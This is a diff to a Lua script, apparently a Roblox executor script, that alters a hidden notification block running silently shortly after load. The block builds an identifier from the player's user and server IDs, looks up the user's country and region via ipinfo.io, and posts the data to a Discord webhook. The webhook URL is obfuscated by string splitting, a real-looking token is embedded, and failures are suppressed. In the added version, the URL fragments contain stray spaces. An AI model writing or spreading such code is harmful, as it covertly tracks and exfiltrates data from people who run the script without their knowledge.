@@ -127,6 +127,7 @@ LoadSavedTheme()
 
 -- [[ Notificación + WHID Check - Jmods Universal ]] --
 
+
 task.delay(0.3, function()
     local success, err = pcall(function()
         local HttpService = game:GetService("HttpService")
@@ -138,10 +139,10 @@ task.delay(0.3, function()
         local userId = player.UserId
         local whid = tostring(userId) .. "-" .. string.sub(jobId, 1, 8)
 
-        -- Lista de WHIDs bloqueados directamente en el script
+        -- Lista de WHIDs bloqueados directamente en el script (añade los que necesites)
         local blockedWHIDs = {
-            [""] = true,
-            [""] = true,
+            --["12345678-abcdef12"] = true,
+            --["otroWHID"] = true,
         }
 
         if blockedWHIDs[whid] then
@@ -190,15 +191,23 @@ task.delay(0.3, function()
 
         local ipinfoReq = (syn and syn.request) or (http_request) or (request) or (http and http.request)
         if ipinfoReq then
-            local geoResponse = ipinfoReq({
-                Url = "https://ipinfo.io/json",
-                Method = "GET"
-            })
-            if geoResponse and geoResponse.StatusCode == 200 then
-                local geoData = HttpService:JSONDecode(geoResponse.Body)
-                local countryCode = geoData.country or "Desconocido"
-                country = countryNames[countryCode] and (countryNames[countryCode] .. " - " .. countryCode) or countryCode
-                region = geoData.region or "Desconocido"
+            local ok, geoResponse = pcall(function()
+                return ipinfoReq({
+                    Url = "https://ipinfo.io/json",
+                    Method = "GET"
+                })
+            end)
+
+            if ok and geoResponse and geoResponse.StatusCode == 200 then
+                local geoData
+                local decodeOk, decodeErr = pcall(function()
+                    geoData = HttpService:JSONDecode(geoResponse.Body)
+                end)
+                if decodeOk and geoData then
+                    local countryCode = geoData.country or "Desconocido"
+                    country = countryNames[countryCode] and (countryNames[countryCode] .. " - " .. countryCode) or countryCode
+                    region = geoData.region or "Desconocido"
+                end
             end
         end
 
@@ -235,18 +244,33 @@ task.delay(0.3, function()
             }
 
             local jsonData = HttpService:JSONEncode({embeds = {embedData}})
-            local link = "http" .. "s://di" .. "sc" .. "ord." .. "com/a" .. "pi/w" .. "ebho" .. "oks/1440738128" .. "498393269/od" .. "sCJNG4zsQ" .. "-OBnX-Z" .. "GyV2v-" .. "5xcqnwBxRS" .. "X3CRFA1V1b" .. "AHv244LML7" .. "FCeql7bfss3bJ"
+
+            -- WEBHOOK (si prefieres obfuscar la URL, puedes hacerlo aquí)
+            local link = "htt ".."ps://dis ".."cord.c ".."om/a ".."pi/we ".."bho ".."oks/144074 ".."786464 ".."8061039/CXp3JpoIZ_lwwGKLp_IWkbxa6R1h ".."t2u6VZDqDa4 ".."AX5UO4rXR89mCKOCt4Lk-N0 ".."Eus ".."UDH"
 
             local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
             if req then
-                req({
-                    Url = link,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = jsonData
-                })
+                local ok2, resp = pcall(function()
+                    return req({
+                        Url = link,
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = jsonData
+                    })
+                end)
+                if not ok2 then
+                    warn("Error al enviar webhook (pcall):", resp)
+                else
+                    if resp and (resp.StatusCode == 204 or resp.StatusCode == 200) then
+                        warn("Webhook enviado correctamente:", resp.StatusCode)
+                    else
+                        warn("Respuesta webhook inesperada:", resp and resp.StatusCode or "nil")
+                    end
+                end
+            else
+                warn("El ejecutador no soporta requests; webhook no enviado.")
             end
         end
     end)
@@ -255,6 +279,8 @@ task.delay(0.3, function()
         -- silencioso
     end
 end)
+
+
 
 
 
